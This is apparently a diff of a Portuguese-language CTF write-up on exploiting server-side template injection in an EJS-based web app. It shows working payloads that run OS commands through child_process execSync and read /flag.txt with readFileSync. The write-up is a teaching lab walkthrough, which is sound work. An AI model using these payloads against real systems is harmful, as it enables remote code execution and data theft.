@@ -32,7 +32,7 @@ Imagine um campo de entrada cujo conteúdo é renderizado diretamente por um mot
 
 Se o conteúdo enviado por um usuário for passado diretamente ao template, um atacante pode tentar algo como:
 
-```ejs
+```e
 <%= require('child_process').execSync('id').toString() %>
 ```
 
@@ -44,31 +44,34 @@ Se o ambiente permitir, esse código executa o comando `id` no sistema operacion
 
 Comecei explorando a aplicação web, buscando interações e pistas no código-fonte. Logo percebi um comentário HTML curioso:
 
-```html
+```
+<!-- alfredo -->
 ```
 
 A URL acessada era:
 
-```text
+```
 gato?name=alfredo
 ```
 
 Ao alterar o parâmetro para `teste123` (`gato?name=teste123`), o comentário foi atualizado:
 
-```html
+```
+<!-- teste123 -->
 ```
 
 🚨 **Entrada refletida diretamente em HTML = potencial vulnerabilidade.**
 
 Decidi então testar se a aplicação processava a entrada como parte de um template. Após algumas tentativas com payloads comuns (URL-encoded), utilizei:
 
-```matlab
+```
 <%= 2*2 %>
 ```
 
 O resultado refletido foi:
 
-```html
+```
+<!-- 4 -->
 ```
 
 ✅ **Vulnerabilidade confirmada!**
@@ -84,7 +87,7 @@ Com a vulnerabilidade confirmada, o próximo passo foi alcançar uma **Execuçã
 
 #### Payload:
 
-```ejs
+```
 <%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls /").toString() %>
 ```
 
@@ -110,7 +113,7 @@ Com a flag localizada, bastava ler seu conteúdo. 📖✨
 
 #### Payload:
 
-```ejs
+```
 <%= global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8') %>
 ```
 
@@ -123,7 +126,8 @@ Com a flag localizada, bastava ler seu conteúdo. 📖✨
 
 A flag foi exibida diretamente no comentário HTML:
 
-```php-template
+```
+<!-- CTF{SUA_FLAG_AQUI} -->
 ```
 
 🏁 **Flag capturada com sucesso!** 🎊🐾
